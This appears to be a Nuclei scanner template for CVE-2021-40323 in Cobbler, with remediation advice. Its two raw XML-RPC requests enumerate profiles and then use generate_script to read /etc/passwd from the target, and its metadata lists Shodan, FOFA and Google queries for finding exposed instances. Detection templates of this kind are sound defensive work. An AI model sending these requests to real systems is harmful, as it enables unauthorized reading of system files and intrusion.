http:
- extractors:
  - group: 1
    internal: true
    name: profile
    regex:
    - <value><string>(.*?)</string></value>
    type: regex
  matchers:
  - part: header
    type: word
    words:
    - text/xml
  - condition: or
    regex:
    - root:.*:0
    - bin:.*:1
    - nobody:.*:99
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\
    \n<?xml version='1.0'?>\n<methodCall>\n  <methodName>find_profile</methodName>\n\
    \  <params>\n    <param>\n      <value>\n        <struct>\n          <member>\n\
    \            <name>name</name>\n            <value>\n              <string>*</string>\n\
    \            </value>\n          </member>\n        </struct>\n      </value>\n\
    \    </param>\n  </params>\n</methodCall>\n"
  - "POST {{BaseURL}}/cobbler_api HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\
    \n<?xml version='1.0'?>\n<methodCall>\n  <methodName>generate_script</methodName>\n\
    \  <params>\n    <param>\n      <value>\n        <string>{{profile}}</string>\n\
    \      </value>\n    </param>\n    <param>\n      <value>\n        <string></string>\n\
    \      </value>\n    </param>\n    <param>\n      <value>\n        <string>/etc/passwd</string>\n\
    \      </value>\n    </param>\n  </params>\n</methodCall>\n"
id: CVE-2021-40323
info:
  author: c-sh0
  classification:
    cpe: cpe:2.3:a:cobbler_project:cobbler:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-40323
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
    epss-percentile: 0.99782
    epss-score: 0.93171
  description: Cobbler before 3.3.0 allows log poisoning and resultant remote code
    execution via an XMLRPC method.
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    remote code execution, potentially resulting in complete compromise of the affected
    system.

    '
  metadata:
    fofa-query: title="cobbler web interface"
    google-query: intitle:"cobbler web interface"
    max-request: 2
    product: cobbler
    shodan-query: http.title:"cobbler web interface"
    vendor: cobbler_project
  name: Cobbler <3.3.0 - Remote Code Execution
  reference:
  - https://github.com/cobbler/cobbler/releases/tag/v3.3.0
  - https://github.com/cobbler/cobbler/issues/2795
  - https://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-40323
  - https://github.com/cobbler/cobbler/commit/d8f60bbf14a838c8c8a1dba98086b223e35fe70a
  remediation: 'Upgrade Cobbler to version 3.3.0 or later, which includes a fix for
    this vulnerability.

    '
  severity: critical
  tags: cve,cve2021,cobbler,rce,cobbler_project,vuln
